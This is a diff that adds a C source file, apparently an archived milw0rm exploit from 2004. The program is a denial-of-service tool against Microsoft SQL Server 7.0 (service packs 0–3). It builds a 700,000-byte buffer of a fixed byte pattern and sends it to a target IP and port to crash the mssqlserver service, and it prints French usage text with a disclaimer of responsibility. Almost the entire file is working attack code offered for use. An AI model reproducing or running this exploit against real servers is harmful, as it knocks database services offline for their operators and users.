@@ -1,0 +1,76 @@
+ /* Microsoft mssql 7.0 server is vulnerable to denial of service attack
+* By sending a large buffer with specified data an attacker can stop
+the service
+* "mssqlserver" the error noticed is different according to services'
+pack but the result is always
+* the same one.
+* Exception Codes = c0000005
+* vulnerable: MSSQL7.0 sp0 - sp1 - sp2 - sp3
+* This code is for educational purposes, I am not responsible for your acts
+* Greets:sm0g DEADm|x #crack.fr itmaroc and evryone who I forgot */
+
+#include <stdio.h>
+#include <winsock.h>
+
+#pragma comment(lib,"ws2_32")
+u_long resolv(char*);
+
+
+void main(int argc, char **argv) {
+WSADATA WinsockData;
+SOCKET s;
+int i;
+struct sockaddr_in vulh;
+char buffer[700000];
+for(i=0;i<700000;i+=16)memcpy(buffer+i,"\x10\x00\x00\x10\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc",16);
+
+
+if (argc!=3) {
+printf(" MSSQL denial of service\n");
+printf(" by securma massine\n");
+printf("Cet outil a ete cree pour test ,je ne suis en aucun cas
+responsable des degats que vous pouvez en faire\n");
+printf("Syntaxe: MSSQLdos <ip> <port>\n");
+exit(1);
+}
+
+WSAStartup(0x101,&WinsockData);
+s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+
+ZeroMemory(&vulh,sizeof(vulh));
+vulh.sin_family=AF_INET;
+vulh.sin_addr.s_addr=resolv(argv[1]);
+vulh.sin_port=htons(atoi(argv[2]));
+if (connect(s,(struct sockaddr*)&vulh,sizeof(vulh))==SOCKET_ERROR) {
+printf("Impossible de se connecter...le port est en generale 1433...\n");
+exit(1);
+}
+
+{
+send(s,buffer,sizeof(buffer),0);
+
+printf("Data envoyes...\n");
+}
+printf("\nattendez quelques secondes et verifiez que le serveur ne
+repond plus.\n");
+closesocket(s);
+WSACleanup();
+}
+
+
+u_long resolv(char *host_name) {
+struct in_addr addr;
+struct hostent *host_ent;
+
+if ((addr.s_addr = inet_addr(host_name)) == -1) {
+if (!(host_ent = gethostbyname(host_name))) {
+printf ("Erreur DNS : Impossible de résoudre l'adresse %s
+!!!\n",host_name);
+exit(1);
+}
+CopyMemory((char *)&addr.s_addr,host_ent->h_addr,host_ent->h_length);
+}
+return addr.s_addr;
+}
+
+// milw0rm.com [2004-09-29]
